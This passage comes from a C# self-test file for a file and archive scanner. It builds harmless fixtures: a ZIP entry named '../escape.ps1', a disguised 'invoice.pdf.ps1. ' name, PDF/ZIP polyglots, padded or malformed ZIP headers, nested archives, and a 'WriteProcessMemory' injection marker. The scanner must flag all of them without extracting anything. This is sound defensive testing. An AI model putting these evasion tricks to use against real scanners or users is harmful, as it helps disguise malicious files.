            return file.ShortcutArguments.Contains("-enc", StringComparison.Ordinal) &&
                   Has("encoded-command") &&
                   Has("shortcut-runs-interpreter") &&
                   Has("shortcut-hidden-start") &&
                   file.RiskCode.Equals("HIGH", StringComparison.Ordinal);
        });

    /// <summary>
    /// A container this product can name but cannot open must never read as a finished inspection, or the
    /// cheapest evasion is simply to pick the wrapper that is not opened.
    /// </summary>
    private static bool TestUnopenedContainerIsNeverClear() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "payload.7z");
            File.WriteAllBytes(path, [0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00]);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.FileType.Equals(FileInspector.SevenZipType, StringComparison.Ordinal) &&
                   file.InspectionLimited &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("container-unopened", StringComparison.Ordinal)) &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   !result.AssessmentCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>
    /// Reports an escaping path and active content inside an archive from the central directory alone:
    /// nothing is extracted, so the escaping entry must not appear next to the archive.
    /// </summary>
    private static bool TestArchiveFindingsWithoutExtraction() =>
        WithFixtureDirectory(directory =>
        {
            string archivePath = Path.Combine(directory, "sample.zip");
            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
            {
                using var writer = new StreamWriter(archive.CreateEntry("../escape.ps1").Open());
                writer.Write("Write-Output safe-test");
            }

            ScanResult result = Inspect(archivePath);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-traversal", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-active-content", StringComparison.Ordinal)) &&
                   !File.Exists(Path.Combine(directory, "escape.ps1")) &&
                   !File.Exists(Path.Combine(Path.GetDirectoryName(directory)!, "escape.ps1"));
        });

    private static bool TestArchiveCapabilityFindingUpgradesToActiveEntry() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "capability-order.zip");
            byte[] marker = Encoding.ASCII.GetBytes("WriteProcessMemory");
            using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
            {
                using (Stream decoy = archive.CreateEntry("decoy.pdf", CompressionLevel.NoCompression).Open())
                {
                    decoy.Write(marker);
                }
                using (Stream active = archive.CreateEntry("payload.ps1", CompressionLevel.NoCompression).Open())
                {
                    active.Write(new byte[1024]);
                    active.Write(marker);
                }
            }

            ScanResult result = Inspect(path);
            Indicator? finding = result.Files.Single().Indicators.SingleOrDefault(
                indicator => indicator.Code.Equals("archive-entry-process-injection", StringComparison.Ordinal));
            return finding is not null &&
                   finding.Score == 35 &&
                   finding.English.Contains("payload.ps1", StringComparison.Ordinal);
        });

    private static bool TestDirectoryNamedArchiveEntryBodyIsScanned() =>
        WithFixtureDirectory(directory =>
        {
            byte[] body = Encoding.ASCII.GetBytes("WriteProcessMemory");
            string archivePath = Path.Combine(directory, "directory-data.zip");
            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
            {
                using Stream entry = archive.CreateEntry("payload/", CompressionLevel.NoCompression).Open();
                entry.Write(body);
            }

            ScanResult result = Inspect(archivePath);
            if (result.Files.Count != 1) return false;
            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-directory-data", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-entry-process-injection", StringComparison.Ordinal)) &&
                   file.ArchiveContentEligibleBytes == body.Length &&
                   file.ArchiveContentScannedBytes == body.Length;
        });

    private static bool TestUnderreportedArchiveEntryBodyIsStillScanned() =>
        WithFixtureDirectory(directory =>
        {
            byte[] body = Encoding.ASCII.GetBytes("WriteProcessMemory");
            using var archiveBytes = new MemoryStream();
            using (var archive = new ZipArchive(archiveBytes, ZipArchiveMode.Create, leaveOpen: true))
            {
                using Stream entry = archive.CreateEntry("payload.ps1", CompressionLevel.NoCompression).Open();
                entry.Write(body);
            }

            byte[] malformed = archiveBytes.ToArray();
            int centralOffset = FindSignatureOffset(malformed, 0x02014B50);
            if (centralOffset < 0) return false;
            BinaryPrimitives.WriteUInt32LittleEndian(malformed.AsSpan(centralOffset + 24), 0);
            string path = Path.Combine(directory, "underreported.zip");
            File.WriteAllBytes(path, malformed);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;
            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-entry-size-mismatch", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-entry-process-injection", StringComparison.Ordinal)) &&
                   file.ArchiveContentScannedBytes == body.Length &&
                   file.ArchiveContentTotalKnown &&
                   file.ArchiveContentEligibleBytes == body.Length &&
                   file.InspectionLimited &&
                   result.IsPartial;
        });

    private static bool TestPdfZipPolyglotInspectsBothFormats() =>
        WithFixtureDirectory(directory =>
        {
            byte[] body = Encoding.ASCII.GetBytes("WriteProcessMemory");
            using var zipBytes = new MemoryStream();
            using (var archive = new ZipArchive(zipBytes, ZipArchiveMode.Create, leaveOpen: true))
            {
                using Stream entry = archive.CreateEntry("payload.ps1", CompressionLevel.NoCompression).Open();
                entry.Write(body);
            }

            byte[] pdfPrefix = Encoding.ASCII.GetBytes("%PDF-1.7\r\n% inert polyglot prefix\r\n");
            byte[] zipPayload = zipBytes.ToArray();
            byte[] combined = new byte[pdfPrefix.Length + zipPayload.Length];
            pdfPrefix.CopyTo(combined, 0);
            zipPayload.CopyTo(combined, pdfPrefix.Length);
            string path = Path.Combine(directory, "polyglot.pdf");
            File.WriteAllBytes(path, combined);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;
            FileAnalysis file = result.Files[0];
            return file.FileType.Equals("PDF", StringComparison.Ordinal) &&
                   file.EmbeddedZipPayload &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-polyglot", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-entry-process-injection", StringComparison.Ordinal)) &&
                   file.InspectionLimited &&
                   result.IsPartial;
        });

    private static bool TestMalformedEmbeddedZipIsIncomplete() =>
        WithFixtureDirectory(directory =>
        {
            byte[] prefix = Encoding.ASCII.GetBytes("ordinary-prefix");
            byte[] bytes = new byte[prefix.Length + 22];
            prefix.CopyTo(bytes, 0);
            BinaryPrimitives.WriteUInt32LittleEndian(bytes.AsSpan(prefix.Length), 0x06054B50);
            BinaryPrimitives.WriteUInt32LittleEndian(bytes.AsSpan(prefix.Length + 16), 1);
            string path = Path.Combine(directory, "malformed.bin");
            File.WriteAllBytes(path, bytes);

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("invalid-embedded-archive", StringComparison.Ordinal)) &&
                   result.Files[0].InspectionLimited &&
                   result.IsPartial;
        });

    /// <summary>
    /// Prepends more than the ordinary sample window to a ZIP without repairing its relative offsets, then
    /// puts a capability token across an entry-content chunk boundary. Passing proves that the prefix is not
    /// a type-evasion trick, the body is streamed without extraction, and a double extension remains visible.
    /// </summary>
    private static bool TestPrefixedArchiveBodyInspection() =>
        WithFixtureDirectory(directory =>
        {
            byte[] marker = Encoding.ASCII.GetBytes("WriteProcessMemory");
            byte[] entryBytes = Enumerable.Repeat((byte)'A', 256 * 1024 + marker.Length).ToArray();
            marker.CopyTo(entryBytes, 256 * 1024 - 8);

            using var zipBytes = new MemoryStream();
            using (var archive = new ZipArchive(zipBytes, ZipArchiveMode.Create, leaveOpen: true))
            {
                ZipArchiveEntry entry = archive.CreateEntry("invoice.pdf.ps1. ", CompressionLevel.Fastest);
                using Stream entryStream = entry.Open();
                entryStream.Write(entryBytes);
            }

            byte[] prefix = Enumerable.Repeat((byte)'P', 8 * 1024 * 1024 + 17).ToArray();
            byte[] zipPayload = zipBytes.ToArray();
            byte[] combined = new byte[prefix.Length + zipPayload.Length];
            prefix.CopyTo(combined, 0);
            zipPayload.CopyTo(combined, prefix.Length);
            string archivePath = Path.Combine(directory, "prefixed.bin");
            File.WriteAllBytes(archivePath, combined);

            ScanResult result = Inspect(archivePath);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            bool Has(string code) => file.Indicators.Any(indicator => indicator.Code.Equals(code, StringComparison.Ordinal));
            string report = ReportBuilder.Build(result, "en");
            using JsonDocument document = JsonDocument.Parse(ReportBuilder.BuildJson(result, "en"));
            JsonElement root = document.RootElement;
            JsonElement jsonResult = root.GetProperty("result");
            JsonElement jsonFile = root.GetProperty("files")[0];
            return file.FileType.Equals(FileInspector.ZipPackageType, StringComparison.Ordinal) &&
                   file.ArchiveHasPrefix &&
                   file.ArchivePrefixBytes == prefix.Length &&
                   file.ArchiveContentScanApplicable &&
                   file.ArchiveContentTotalKnown &&
                   file.ArchiveContentEligibleBytes == entryBytes.Length &&
                   file.ArchiveContentScannedBytes == entryBytes.Length &&
                   Has("archive-prefix") &&
                   Has("archive-double-extension") &&
                   Has("archive-windows-name-normalization") &&
                   Has("archive-entry-process-injection") &&
                   file.InspectionLimited &&
                   result.IsPartial &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   report.Contains($"ZIP entry-content scan: {FileAnalysis.FormatSize(entryBytes.Length)} / {FileAnalysis.FormatSize(entryBytes.Length)}", StringComparison.Ordinal) &&
                   root.GetProperty("schema").GetString() is "pc-black-box-report-v4" &&
                   jsonResult.GetProperty("archiveContentEligibleBytes").GetInt64() == entryBytes.Length &&
                   jsonResult.GetProperty("archiveContentScannedBytes").GetInt64() == entryBytes.Length &&
                   jsonResult.GetProperty("archiveContentTotalKnown").GetBoolean() &&
                   jsonFile.GetProperty("archiveHasPrefix").GetBoolean() &&
                   jsonFile.GetProperty("archivePrefixBytes").GetInt64() == prefix.Length &&
                   !File.Exists(Path.Combine(directory, "invoice.pdf.ps1"));
        });

    private static bool TestDisguisedNestedFormatsStayIncomplete() =>
        WithFixtureDirectory(directory =>
        {
            byte[] ole = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0, 0, 0];
            byte[] iso = new byte[0x8006];
            "CD001"u8.CopyTo(iso.AsSpan(0x8001));
            byte[] pe = [0x4D, 0x5A, 0, 0, 0, 0];

            bool InspectPayload(string name, byte[] payload, string expectedCode)
            {
                string path = Path.Combine(directory, name + ".zip");
                using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
                {
                    using Stream entry = archive.CreateEntry("payload.dat", CompressionLevel.NoCompression).Open();
                    entry.Write(payload);
                }

                ScanResult result = Inspect(path);
                return result.Files.Count == 1 &&
                       result.Files[0].Indicators.Any(indicator => indicator.Code.Equals(expectedCode, StringComparison.Ordinal)) &&
                       result.Files[0].InspectionLimited &&
                       result.IsPartial;
            }

            return InspectPayload("nested-ole", ole, "nested-archive-unopened") &&
                   InspectPayload("nested-iso", iso, "nested-archive-unopened") &&
                   InspectPayload("nested-pe", pe, "archive-entry-active-payload");
        });

    private static bool TestNestedArchiveNeverLooksComplete() =>
        WithFixtureDirectory(directory =>
        {
            using var innerBytes = new MemoryStream();
            using (var inner = new ZipArchive(innerBytes, ZipArchiveMode.Create, leaveOpen: true))
            {
                using Stream content = inner.CreateEntry("one.txt", CompressionLevel.NoCompression).Open();
                content.WriteByte(1);
            }

            string outerPath = Path.Combine(directory, "outer.zip");
            using (var outer = ZipFile.Open(outerPath, ZipArchiveMode.Create))
            {
                using (Stream nested = outer.CreateEntry("payload.dat", CompressionLevel.NoCompression).Open())
                {
                    byte[] innerArchive = innerBytes.ToArray();
                    nested.WriteByte((byte)'P');
                    nested.Write(innerArchive);
                }
            }

            ScanResult result = Inspect(outerPath);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("nested-archive-unopened", StringComparison.Ordinal)) &&
                   result.Files[0].InspectionLimited &&
                   result.IsPartial &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   !File.Exists(Path.Combine(directory, "payload.dat"));
        });

    private static bool TestLoneZipEndMarkerDoesNotClaimNestedArchive() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "marker-only.zip");
            using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
            {
                using Stream entry = archive.CreateEntry("notes.dat", CompressionLevel.NoCompression).Open();
                entry.Write([0x50, 0x4B, 0x05, 0x06]);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.All(indicator => !indicator.Code.Equals("nested-archive-unopened", StringComparison.Ordinal));
        });

    private static bool TestPrefixedZip64IsRecognized() =>
        WithFixtureDirectory(directory =>
        {
            byte[] prefix = Encoding.ASCII.GetBytes("zip64-prefix");
            byte[] zip64 = CreateEmptyZip64ArchiveBytes();
            byte[] combined = new byte[prefix.Length + zip64.Length];
            prefix.CopyTo(combined, 0);
            zip64.CopyTo(combined, prefix.Length);
            string path = Path.Combine(directory, "prefixed-zip64.bin");
            File.WriteAllBytes(path, combined);

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].FileType.Equals(FileInspector.ZipPackageType, StringComparison.Ordinal) &&
                   result.Files[0].ArchiveHasPrefix &&
                   result.Files[0].ArchivePrefixBytes == prefix.Length &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("archive-prefix", StringComparison.Ordinal)) &&
                   result.Files[0].Indicators.All(indicator => !indicator.Code.Equals("invalid-archive", StringComparison.Ordinal));
        });

    private static bool TestPrefixedExtendedZip64IsRecognized() =>
        WithFixtureDirectory(directory =>
        {
            byte[] prefix = Encoding.ASCII.GetBytes("extended-zip64-prefix");
            byte[] zip64 = CreateEmptyZip64ArchiveBytes(extensibleDataBytes: 8);
            byte[] combined = new byte[prefix.Length + zip64.Length];
            prefix.CopyTo(combined, 0);
            zip64.CopyTo(combined, prefix.Length);
            string path = Path.Combine(directory, "prefixed-extended-zip64.bin");
            File.WriteAllBytes(path, combined);

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].FileType.Equals(FileInspector.ZipPackageType, StringComparison.Ordinal) &&
                   result.Files[0].ArchiveHasPrefix &&
                   result.Files[0].ArchivePrefixBytes == prefix.Length &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("archive-prefix", StringComparison.Ordinal)) &&
                   result.Files[0].Indicators.All(indicator => !indicator.Code.Equals("invalid-archive", StringComparison.Ordinal));
        });

    /// <summary>Confirms an already-canceled inspection ends without opening the target.</summary>
    private static bool TestCanceledInspectionReadsNothing() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "cancel.txt");
            File.WriteAllText(path, "not read");
            using var cancellation = new CancellationTokenSource();
            cancellation.Cancel();

            try
            {
                Inspect(path, cancellation.Token);
                return false;
            }
            catch (OperationCanceledException)
            {
                return true;
            }
        });

    private static ScanResult Inspect(string targetPath, CancellationToken cancellationToken = default) =>
        new FileInspector().ScanAsync(targetPath, null, cancellationToken).GetAwaiter().GetResult();

    /// <summary>
    /// Runs one check inside a private temporary directory and removes that directory afterwards. The
    /// directory is created by this process, so no caller-supplied target is inspected.
    /// </summary>
    private static bool WithFixtureDirectory(Func<string, bool> check)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        Directory.CreateDirectory(directory);
        try
        {
            return check(directory);
        }
        finally
        {
            try
            {
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: true);
                }
            }
            catch { }
        }
    }

    private static FileAnalysis CreateFile(
        string relativePath,
        string fileType,
        string signatureStatus,
        string signer,
        string sourceHost,
        Indicator? indicator = null)
    {
        var file = new FileAnalysis
        {
            RelativePath = relativePath,
            FileType = fileType,
            SignatureStatus = signatureStatus,
            Signer = signer,
            SourceHost = sourceHost
        };
        if (indicator is not null) file.Indicators.Add(indicator);
        return file;
    }

    private static bool TestGuardedReportReplacement(ScanResult result)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        string reportPath = Path.Combine(directory, "report.md");
        bool replacementVerified = false;
        try
        {
            Directory.CreateDirectory(directory);
            SafeReportWriter.Write(reportPath, "first", result, ".md", allowOverwrite: false);
            SafeReportWriter.Write(reportPath, "second", result, ".md", allowOverwrite: true);
            using FileStream stream = SecureFileReader.OpenRead(reportPath, 4096);
            using var reader = new StreamReader(stream);
            replacementVerified = reader.ReadToEnd().Equals("second", StringComparison.Ordinal);
        }
        finally
        {
            try
            {
                if (File.Exists(reportPath) && (File.GetAttributes(reportPath) & FileAttributes.ReparsePoint) == 0)
                {
                    File.Delete(reportPath);
                }
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: false);
                }
            }
            catch { }
        }
        return replacementVerified &&
               !File.Exists(reportPath) && !Directory.Exists(reportPath) &&
               !File.Exists(directory) && !Directory.Exists(directory);
    }

    private static bool TestValidEmptyArchivePreflight()
    {
        using var stream = new MemoryStream();
        using (new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
        }
        stream.Position = 0;
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestArchiveEntryFloodPreflight()
    {
        byte[] endRecord = new byte[22];
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(8), 10001);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(10), 10001);
        using var stream = new MemoryStream(endRecord, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestValidSingleEntryArchivePreflight()
    {
        using MemoryStream stream = CreateSingleEntryArchive();
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestUnderreportedArchivePreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] bytes = validArchive.ToArray();
        int endRecordOffset = bytes.Length - 22;
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 8), 0);
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 10), 0);
        using var malformedArchive = new MemoryStream(bytes, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(malformedArchive);
    }

    private static bool TestAmbiguousEndRecordPreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] original = validArchive.ToArray();
        byte[] ambiguous = new byte[original.Length + 22];
        original.CopyTo(ambiguous, 0);
        BinaryPrimitives.WriteUInt32LittleEndian(ambiguous.AsSpan(original.Length), 0x06054B50);
        using var stream = new MemoryStream(ambiguous, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static MemoryStream CreateSingleEntryArchive()
    {
        var stream = new MemoryStream();
        using (var archive = new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
            ZipArchiveEntry entry = archive.CreateEntry("one.txt", CompressionLevel.NoCompression);
            using Stream entryStream = entry.Open();
            entryStream.WriteByte(1);
        }
        stream.Position = 0;
        return stream;
    }

    private static bool TestValidEmptyZip64Preflight()
    {
        byte[] bytes = CreateEmptyZip64ArchiveBytes();
        using var stream = new MemoryStream(bytes, writable: false);
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static byte[] CreateEmptyZip64ArchiveBytes(int extensibleDataBytes = 0)
    {
        int zip64EndLength = checked(56 + extensibleDataBytes);
        byte[] bytes = new byte[zip64EndLength + 20 + 22];
        Span<byte> zip64End = bytes.AsSpan(0, zip64EndLength);
        BinaryPrimitives.WriteUInt32LittleEndian(zip64End, 0x06064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(zip64End[4..], checked((ulong)(44 + extensibleDataBytes)));
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[12..], 45);
        BinaryPrimitives.WriteUInt16LittleEndian(zip64End[14..], 45);

        Span<byte> locator = bytes.AsSpan(zip64EndLength, 20);
        BinaryPrimitives.WriteUInt32LittleEndian(locator, 0x07064B50);
        BinaryPrimitives.WriteUInt64LittleEndian(locator[8..], 0);
        BinaryPrimitives.WriteUInt32LittleEndian(locator[16..], 1);

        Span<byte> endRecord = bytes.AsSpan(zip64EndLength + 20, 22);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[4..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[6..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[8..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord[10..], UInt16.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[12..], UInt32.MaxValue);
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord[16..], UInt32.MaxValue);
        return bytes;
    }

    private static int FindSignatureOffset(ReadOnlySpan<byte> bytes, uint signature)
    {
        for (int index = 0; index <= bytes.Length - sizeof(uint); index++)
        {
            if (BinaryPrimitives.ReadUInt32LittleEndian(bytes[index..]) == signature) return index;
        }
        return -1;
    }

    private static void Require(bool condition, ref int checks)
    {
        checks++;
        if (!condition) throw new InvalidOperationException("A product self-test check failed.");
    }
}
